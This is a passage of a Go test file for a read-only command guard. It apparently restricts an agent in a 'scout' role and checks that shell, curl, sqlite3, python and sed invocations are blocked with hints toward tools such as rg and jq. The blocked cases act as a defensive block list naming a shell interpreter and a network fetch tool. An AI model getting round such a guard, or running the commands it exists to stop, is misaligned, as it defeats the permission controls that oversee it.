		t.Run(tc.name, func(t *testing.T) {
			var got string
			if tc.code != "" {
				got = guardShellReadonly(tc.code)
			} else {
				got = guardArgvReadonly(tc.argv)
			}
			if got != "" {
				t.Fatalf("expected allow, got %q (argv=%v code=%q)", got, tc.argv, tc.code)
			}
		})
	}
}

func TestReadonlyAllowlist_ShortOptsDisjoint(t *testing.T) {
	for name, entry := range readonlyAllowlist {
		if entry == nil {
			continue
		}
		for i := 0; i < len(entry.shortBool); i++ {
			ch := entry.shortBool[i]
			if strings.IndexByte(entry.shortValue, ch) >= 0 {
				t.Errorf("%s: shortBool and shortValue both contain %q", name, string(ch))
			}
		}
	}
}

func TestReadonlyAllowlist_AlFix4_HintAlternatives(t *testing.T) {
	t.Setenv(auditEnvRole, "scout")
	t.Setenv(auditEnvReadonly, "")

	cases := []struct {
		name string
		argv []string
		code string
		want []string
	}{
		{name: "bash hint", argv: []string{"bash", "-c", "ls"}, want: []string{"rg", "jq"}},
		{name: "curl hint", argv: []string{"curl", "-s", "https://x"}, want: []string{"cat", "rg"}},
		{name: "sqlite hint", argv: []string{"sqlite3", "-readonly", "-safe", "a.db", "SELECT 1"}, want: []string{"jq"}},
		{name: "python hint", argv: []string{"python3", "-m", "json.tool"}, want: []string{"jq"}},
		{name: "sed hint", argv: []string{"sed", "s/a/b/", "f"}, want: []string{"rg"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var got string
			if tc.code != "" {
				got = guardShellReadonly(tc.code)
			} else {
				got = guardArgvReadonly(tc.argv)
			}
			if got == "" {
				t.Fatalf("expected block")
			}
			hinted := readonlyBlockWithHint(got)
			low := strings.ToLower(hinted)
			for _, w := range tc.want {
				if !strings.Contains(low, strings.ToLower(w)) {
					t.Fatalf("hint %q missing %q", hinted, w)
				}
			}
		})
	}
}
